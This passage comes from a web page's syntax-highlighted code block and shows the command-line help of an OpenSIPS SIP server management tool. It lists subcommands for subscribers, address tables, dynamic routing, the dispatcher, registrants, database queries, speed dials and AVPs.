&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; rpid rm &amp;lt;username&amp;gt; ................. set rpid to NULL &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; a user &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; rpid show &amp;lt;username&amp;gt; ............... show rpid of a user
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -- command &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;add|passwd|rm&amp;#39;&lt;/span&gt; - manage subscribers
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; add &amp;lt;username&amp;gt; &amp;lt;password&amp;gt; .......... add a new subscriber &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; passwd &amp;lt;username&amp;gt; &amp;lt;passwd&amp;gt; ......... change user&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s password (*)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; rm &amp;lt;username&amp;gt; ...................... delete a user (*)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; -- command &amp;#39;&lt;/span&gt;add|dump|reload|rm|show&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; - manage address
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; address show ...................... show db content
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; address dump ...................... show cache content
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; address reload .................... reload db table into cache
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; address add &amp;lt;grp&amp;gt; &amp;lt;ip&amp;gt; &amp;lt;mask&amp;gt; &amp;lt;port&amp;gt; &amp;lt;proto&amp;gt; [&amp;lt;context_info&amp;gt;] [&amp;lt;pattern&amp;gt;]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;             ....................... add a new entry
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	     ....................... (from_pattern and tag are optional arguments)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; address rm &amp;lt;grp&amp;gt; &amp;lt;ip&amp;gt; &amp;lt;mask&amp;gt; &amp;lt;port&amp;gt; ............... remove all entries
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	     ....................... for the given grp ip mask port
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; -- command &amp;#39;&lt;/span&gt;dr&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; - manage dynamic routing
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   * Examples: dr addgw &amp;#39;&lt;/span&gt;1&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; 10 &amp;#39;&lt;/span&gt;192.168.2.2&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; 0 &amp;#39;&amp;#39; &amp;#39;&lt;/span&gt;GW001&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; 0 &amp;#39;&lt;/span&gt;first_gw&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   *           dr addgw &amp;#39;&lt;/span&gt;2&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; 20 &amp;#39;&lt;/span&gt;192.168.2.3&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; 0 &amp;#39;&amp;#39; &amp;#39;&lt;/span&gt;GW002&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; 0 &amp;#39;&lt;/span&gt;second_gw&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   *           dr rmgw 2
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   *           dr addgrp &amp;#39;&lt;/span&gt;alice&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;example.com&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; 10 &amp;#39;&lt;/span&gt;first group&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   *           dr rmgrp 1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   *           dr addcr &amp;#39;&lt;/span&gt;cr_1&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;10&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; 0 &amp;#39;&lt;/span&gt;CARRIER_1&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;first_carrier&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   *           dr rmcr 1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   *           dr addrule &amp;#39;&lt;/span&gt;10,20&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;+1&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;20040101T083000&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; 0 0 &amp;#39;&lt;/span&gt;1,2&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;NA_RULE&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;NA routing&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   *           dr rmrule 1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; dr show ............................ show dr tables
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; dr addgw &amp;lt;gwid&amp;gt; &amp;lt;type&amp;gt; &amp;lt;address&amp;gt; &amp;lt;strip&amp;gt; &amp;lt;pri_prefix&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;          &amp;lt;attrs&amp;gt; &amp;lt;probe_mode&amp;gt; &amp;lt;description&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    ................................. add gateway
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; dr rmgw &amp;lt;id&amp;gt; ....................... delete gateway
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; dr addgrp &amp;lt;username&amp;gt; &amp;lt;domain&amp;gt; &amp;lt;groupid&amp;gt; &amp;lt;description&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    ................................. add gateway group
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; dr rmgrp &amp;lt;id&amp;gt; ...................... delete gateway group
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; dr addcr &amp;lt;carrierid&amp;gt; &amp;lt;gwlist&amp;gt; &amp;lt;flags&amp;gt; &amp;lt;attrs&amp;gt; &amp;lt;description&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;          ........................... add carrier
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; dr rmcr &amp;lt;id&amp;gt; ....................... delete carrier
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; dr addrule &amp;lt;groupid&amp;gt; &amp;lt;prefix&amp;gt; &amp;lt;timerec&amp;gt; &amp;lt;priority&amp;gt; &amp;lt;routeid&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;            &amp;lt;gwlist&amp;gt; &amp;lt;attrs&amp;gt; &amp;lt;description&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    ................................. add rule
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; dr rmrule &amp;lt;ruleid&amp;gt; ................. delete rule
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; dr reload .......................... reload dr tables
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; dr gw_status ....................... show gateway status
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; dr carrier_status .................. show carrier status
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; -- command &amp;#39;&lt;/span&gt;dispatcher&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; - manage dispatcher
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   * Examples:  dispatcher addgw 1 sip:1.2.3.1:5050 &amp;#39;&amp;#39; 0 50 &amp;#39;&lt;/span&gt;og1&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;Outbound Gateway1&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   *            dispatcher addgw 2 sip:1.2.3.4:5050 &amp;#39;&amp;#39; 0 50 &amp;#39;&lt;/span&gt;og2&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;Outbound Gateway2&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   *            dispatcher rmgw 4
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; dispatcher show ..................... show dispatcher gateways
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; dispatcher reload ................... reload dispatcher gateways
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; dispatcher dump ..................... show in memory dispatcher gateways
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; dispatcher addgw &amp;lt;setid&amp;gt; &amp;lt;destination&amp;gt; &amp;lt;socket&amp;gt; &amp;lt;state&amp;gt; &amp;lt;weight&amp;gt; &amp;lt;attrs&amp;gt; [description]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;            .......................... add gateway
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; dispatcher rmgw &amp;lt;id&amp;gt; ................ delete gateway
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; -- command &amp;#39;&lt;/span&gt;registrant&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; - manage registrants
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   * Examples:  registrant add sip:opensips.org &amp;#39;&amp;#39; sip:user@opensips.org &amp;#39;&amp;#39; user password sip:user@localhost &amp;#39;&amp;#39; 3600 &amp;#39;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; registrant show ......................... show registrant table
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; registrant dump ......................... show registrant status
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; registrant add &amp;lt;registrar&amp;gt; &amp;lt;proxy&amp;gt; &amp;lt;aor&amp;gt; &amp;lt;third_party_registrant&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                &amp;lt;username&amp;gt; &amp;lt;password&amp;gt; &amp;lt;binding_URI&amp;gt; &amp;lt;binding_params&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                &amp;lt;expiry&amp;gt; &amp;lt;forced_socket&amp;gt; . add a registrant
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; registrant rm ........................... removes the entire registrant table
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; registrant rmaor &amp;lt;id&amp;gt; ................... removes the gived aor id
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; -- command &amp;#39;&lt;/span&gt;db&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; - database operations
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; db exec &amp;lt;query&amp;gt; ..................... execute SQL query
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; db roexec &amp;lt;roquery&amp;gt; ................. execute read-only SQL query
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; db run &amp;lt;id&amp;gt; ......................... execute SQL query from $id variable
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; db rorun &amp;lt;id&amp;gt; ....................... execute read-only SQL query from
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                                       $id variable
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; db show &amp;lt;table&amp;gt; ..................... display table content
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; -- command &amp;#39;&lt;/span&gt;speeddial&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; - manage speed dials (short numbers)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; speeddial show &amp;lt;speeddial-id&amp;gt; ....... show speeddial details
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; speeddial list &amp;lt;sip-id&amp;gt; ............. list speeddial for uri
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; speeddial add &amp;lt;sip-id&amp;gt; &amp;lt;sd-id&amp;gt; &amp;lt;new-uri&amp;gt; [&amp;lt;desc&amp;gt;] ...
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;           ........................... add a speedial (*)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; speeddial rm &amp;lt;sip-id&amp;gt; &amp;lt;sd-id&amp;gt; ....... remove a speeddial (*)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; speeddial help ...................... help message
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    - &amp;lt;speeddial-id&amp;gt;, &amp;lt;sd-id&amp;gt; must be an AoR (username@domain)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    - &amp;lt;sip-id&amp;gt; must be an AoR (username@domain)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    - &amp;lt;new-uri&amp;gt; must be a SIP AoR (sip:username@domain)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    - &amp;lt;desc&amp;gt; a description for speeddial
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; -- command &amp;#39;&lt;/span&gt;avp&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; - manage AVPs
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; avp list [-T table] [-u &amp;lt;sip-id|uuid&amp;gt;]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;     [-a attribute] [-v value] [-t type] ... list AVPs
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; avp add [-T table] &amp;lt;sip-id|uuid&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;     &amp;lt;attribute&amp;gt; &amp;lt;type&amp;gt; &amp;lt;value&amp;gt; ............ add AVP (*)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; avp rm [-T table]  [-u &amp;lt;sip-id|uuid&amp;gt;]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;     [-a attribute] [-v value] [-t type] ... remove AVP (*)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; avp help .................................. help message
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    - -T - table name
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    - -u - SIP id or unique id
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    - -a - AVP name
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    - -v - AVP value
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    - -t - AVP name and type (0 (str:str), 1 (str:int),
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                              2 (int:str), 3 (int:int))
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    - &amp;lt;sip-id&amp;gt; must be an AoR (username@domain)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    - &amp;lt;uuid&amp;gt; must be a string but not AoR
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; -- command &amp;#39;&lt;/span&gt;alias_db&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; - manage database aliases
